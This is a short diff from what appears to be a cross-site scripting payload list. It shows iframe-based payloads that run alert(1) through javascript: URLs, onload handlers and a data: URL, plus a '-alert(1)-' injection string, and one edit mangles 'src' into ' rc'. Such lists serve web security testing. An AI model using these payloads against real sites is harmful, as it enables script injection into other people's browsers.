@@ -56,7 +56,7 @@
 <iframe src="javascript:alert(1)">
 <iframe onload=alert(1)>
 <iframe/onload=alert(1)>
-<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe  rc="data:text/html,<script>alert(1)</script>">
 
 # siddharth
 '-alert(1)-'
